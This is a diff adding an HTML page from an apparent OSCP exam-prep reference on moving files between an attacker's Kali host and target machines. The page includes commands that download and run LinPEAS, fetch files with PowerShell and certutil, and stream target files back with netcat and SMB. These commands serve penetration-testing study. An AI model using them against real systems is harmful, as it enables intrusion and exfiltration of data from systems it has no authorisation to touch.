@@ -1,0 +1,189 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>File Transfer — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/reference/04-shells-transfers-credentials/01-file-transfer/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#linux-target-pull-linpeas-from-kali-over-http">Linux target: pull LinPEAS from Kali over HTTP</a><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#serve-a-fixed-directory-without-changing-folders">Serve a fixed directory without changing folders</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#linux-target-with-curl">Linux target with curl</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#windows-target-with-powershell">Windows target with PowerShell</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#windows-alternatives">Windows alternatives</a></li></ul></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#verify-the-transfer">Verify the transfer</a><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#kali-to-a-linux-target">Kali to a Linux target</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#linux-target-to-kali">Linux target to Kali</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#ssh-key-or-nonstandard-port">SSH key or nonstandard port</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#start-an-authenticated-smb-share-on-kali">Start an authenticated SMB share on Kali</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#connect-and-download-from-windows">Connect and download from Windows</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#upload-evidence-from-windows-to-kali">Upload evidence from Windows to Kali</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#retrieve-a-file-from-the-target-to-kali">Retrieve a file from the target to Kali</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#send-a-file-from-kali-to-the-target">Send a file from Kali to the target</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#encode-on-linux">Encode on Linux</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#decode-on-linux">Decode on Linux</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#decode-in-powershell">Decode in PowerShell</a></li></ul></li><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#php-http-file-server-when-python-is-unavailable">PHP HTTP file server when Python is unavailable</a></li></ul></details><ul><li><details open><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details open><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/" aria-current="page">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="file-transfer">File Transfer</h1>
+<p><a href="/oscp/">← Reference index</a> · <a href="/oscp/reference/03-initial-access/01-rdp-access/">Previous: RDP access</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | Study methods: <a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></p>
+<blockquote>
+<p><strong>Choose:</strong> HTTP pull when the target can reach Kali; SCP when SSH credentials work; SMB for a Windows-friendly read/write share; Netcat or Base64 only when the simpler route is unavailable.</p>
+</blockquote>
+<h2 id="linux-target-pull-linpeas-from-kali-over-http">Linux target: pull LinPEAS from Kali over HTTP</h2>
+<p>On Kali, serve the directory containing <code>linpeas.sh</code>:</p>
+<pre><code class="language-bash">cd /path/to/tools
+python3 -m http.server 8000 --bind 0.0.0.0
+</code></pre>
+<p>On the Linux target, download into a writable directory and run it:</p>
+<pre><code class="language-bash">wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas.txt
+</code></pre>
+<blockquote>
+<p><strong>Read:</strong> Kali should log an HTTP request and a successful response. A downloaded enumeration script is a lead generator; manually verify any escalation candidate.</p>
+</blockquote>
+<details>
+<summary><strong>HTTP variants — fixed server directory, curl, Windows and alternate built-ins</strong></summary>
+<h3 id="serve-a-fixed-directory-without-changing-folders">Serve a fixed directory without changing folders</h3>
+<pre><code class="language-bash">python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools
+</code></pre>
+<p>Python's simple server supplies downloads over unencrypted HTTP. Stop it with <code>Ctrl+C</code> when finished.</p>
+<h3 id="linux-target-with-curl">Linux target with curl</h3>
+<pre><code class="language-bash">curl -fL http://LHOST:8000/FILE -o /tmp/FILE
+</code></pre>
+<p><code>-f</code> reports HTTP errors and <code>-L</code> follows redirects. Use a writable destination.</p>
+<h3 id="windows-target-with-powershell">Windows target with PowerShell</h3>
+<p>Run inside PowerShell:</p>
+<pre><code class="language-powershell">Invoke-WebRequest -Uri "http://LHOST:8000/FILE" -OutFile "C:\Windows\Temp\FILE"
+</code></pre>
+<p>From <code>cmd.exe</code>, invoke PowerShell explicitly:</p>
+<pre><code class="language-cmd">powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile 'C:\Windows\Temp\FILE'"
+</code></pre>
+<h3 id="windows-alternatives">Windows alternatives</h3>
+<pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('http://LHOST:8000/FILE','C:\Windows\Temp\FILE')
+</code></pre>
+<pre><code class="language-cmd">curl.exe -fL http://LHOST:8000/FILE -o C:\Windows\Temp\FILE
+</code></pre>
+<pre><code class="language-cmd">certutil.exe -urlcache -split -f http://LHOST:8000/FILE C:\Windows\Temp\FILE
+</code></pre>
+<p>Availability and policy can differ by host. <code>certutil</code> may leave URL-cache artifacts; remove only artifacts you created when cleanup is appropriate.</p>
+</details>
+<h2 id="verify-the-transfer">Verify the transfer</h2>
+<p>Compare the source and destination hashes.</p>
+<p>On Kali or Linux:</p>
+<pre><code class="language-bash">sha256sum FILE
+sha256sum /tmp/FILE
+</code></pre>
+<p>On Windows:</p>
+<pre><code class="language-powershell">Get-FileHash -Algorithm SHA256 "C:\Windows\Temp\FILE"
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> matching SHA-256 values establish that the two saved files contain the same bytes. A successful HTTP status alone does not.</p>
+</blockquote>
+<details>
+<summary><strong>SCP — copy through an authenticated SSH service</strong></summary>
+<h3 id="kali-to-a-linux-target">Kali to a Linux target</h3>
+<pre><code class="language-bash">scp FILE USER@TARGET:/tmp/FILE
+</code></pre>
+<h3 id="linux-target-to-kali">Linux target to Kali</h3>
+<p>Run from Kali when the target's SSH service is reachable:</p>
+<pre><code class="language-bash">scp USER@TARGET:/path/to/FILE ./FILE
+</code></pre>
+<h3 id="ssh-key-or-nonstandard-port">SSH key or nonstandard port</h3>
+<pre><code class="language-bash">scp -i KEY -P PORT FILE USER@TARGET:/tmp/FILE
+</code></pre>
+<p><code>scp</code> uses uppercase <code>-P</code> for the SSH port. Authentication success does not guarantee write permission at the destination path.</p>
+</details>
+<details>
+<summary><strong>SMB — read and write files from Windows</strong></summary>
+<h3 id="start-an-authenticated-smb-share-on-kali">Start an authenticated SMB share on Kali</h3>
+<pre><code class="language-bash">mkdir -p share
+sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD'
+</code></pre>
+<p>The first positional value is the share name; the second is its local directory. The supplied <code>USER</code> and <code>PASSWORD</code> authenticate to this temporary Kali share.</p>
+<p>Some installations expose the legacy wrapper name:</p>
+<pre><code class="language-bash">sudo smbserver.py transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD'
+</code></pre>
+<h3 id="connect-and-download-from-windows">Connect and download from Windows</h3>
+<pre><code class="language-cmd">net use \\LHOST\transfer /user:USER "PASSWORD"
+copy \\LHOST\transfer\FILE C:\Windows\Temp\FILE
+</code></pre>
+<h3 id="upload-evidence-from-windows-to-kali">Upload evidence from Windows to Kali</h3>
+<pre><code class="language-cmd">copy C:\Windows\Temp\FILE \\LHOST\transfer\FILE
+net use \\LHOST\transfer /delete
+</code></pre>
+<p>Kali must accept inbound TCP/445 and the target must permit outbound SMB. The share is read/write unless started with Impacket's <code>-readonly</code> option.</p>
+</details>
+<details>
+<summary><strong>Netcat — stream a file when a direct TCP connection is possible</strong></summary>
+<h3 id="retrieve-a-file-from-the-target-to-kali">Retrieve a file from the target to Kali</h3>
+<p>Kali receives:</p>
+<pre><code class="language-bash">nc -lvnp PORT > FILE
+</code></pre>
+<p>The target sends:</p>
+<pre><code class="language-bash">nc -nv LHOST PORT &#x3C; /path/to/FILE
+</code></pre>
+<h3 id="send-a-file-from-kali-to-the-target">Send a file from Kali to the target</h3>
+<p>The target receives:</p>
+<pre><code class="language-bash">nc -lvnp PORT > /tmp/FILE
+</code></pre>
+<p>Kali sends:</p>
+<pre><code class="language-bash">nc -nv TARGET PORT &#x3C; FILE
+</code></pre>
+<p>If the listener rejects <code>-p</code>, use the OpenBSD-style form and check <code>nc -h</code> locally:</p>
+<pre><code class="language-bash">nc -lvn PORT > FILE
+</code></pre>
+<p>Netcat provides no authentication, encryption, filename metadata or integrity check. Confirm direction and compare hashes afterward.</p>
+</details>
+<details>
+<summary><strong>Temporary FTP — only when an FTP client is the available route</strong></summary>
+<p>On Kali, after intentionally selecting/installing <code>pyftpdlib</code> in an isolated environment:</p>
+<pre><code class="language-bash">python3 -m pyftpdlib -p PORT
+</code></pre>
+<p>On the target:</p>
+<pre><code class="language-text">ftp LHOST PORT
+binary
+get FILE
+put FILE
+quit
+</code></pre>
+<p>The default temporary server can be unauthenticated and plaintext. Bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. HTTP/SCP/SMB are normally preferable.</p>
+</details>
+<details>
+<summary><strong>Base64 — move a small file through a text-only channel</strong></summary>
+<h3 id="encode-on-linux">Encode on Linux</h3>
+<pre><code class="language-bash">base64 -w 0 FILE
+</code></pre>
+<h3 id="decode-on-linux">Decode on Linux</h3>
+<pre><code class="language-bash">printf '%s' 'BASE64_DATA' | base64 -d > /tmp/FILE
+</code></pre>
+<h3 id="decode-in-powershell">Decode in PowerShell</h3>
+<pre><code class="language-powershell">[IO.File]::WriteAllBytes('C:\Windows\Temp\FILE',[Convert]::FromBase64String('BASE64_DATA'))
+</code></pre>
+<p>Use this for small files. Long encoded values are easy to truncate or corrupt; compare hashes.</p>
+</details>
+<details>
+<summary><strong>Failure cues — identify the broken layer</strong></summary>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Symptom</th><th>Check next</th></tr></thead><tbody><tr><td>Kali logs no HTTP request</td><td>Confirm <code>LHOST</code>, target-to-Kali route, listener bind address and outbound filtering</td></tr><tr><td>HTTP returns 404</td><td>Confirm the server directory, exact filename and case</td></tr><tr><td>Destination reports permission denied</td><td>Use a writable directory such as <code>/tmp</code> or the current user's Windows temp directory</td></tr><tr><td>File downloads but does not run</td><td>Verify its hash, interpreter/architecture, execute permission and line endings</td></tr><tr><td>SCP authenticates but cannot write</td><td>Change the remote destination to a directory writable by that identity</td></tr><tr><td>SMB connection fails</td><td>Check TCP/445 reachability, credentials, SMB2 support and existing Windows connections to the same server</td></tr><tr><td>Netcat connects but the file differs</td><td>Repeat with clear sender/receiver roles and compare hashes before executing</td></tr></tbody></table>
+</details>
+<h2 id="php-http-file-server-when-python-is-unavailable">PHP HTTP file server when Python is unavailable</h2>
+<p>Use on the sending host when PHP CLI is present and the receiver can reach it. Serve a directory containing only the intended transfer artifacts.</p>
+<pre><code class="language-bash">php -S 0.0.0.0:8000 -t ./transfer
+
+# Receiver: use the actual sender address and verify the received artifact
+curl -f http://LHOST:8000/FILE -o FILE
+</code></pre>
+<p>Read: this is a file-serving route, not an upload server or a shell. Check the HTTP status, file size/hash and target architecture before execution. If the target cannot initiate this connection, choose another transfer direction/transport rather than restarting the same server.</p>
+<p>Sources: <a href="https://www.php.net/manual/en/features.commandline.webserver.php">upstream 1</a>.</p></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
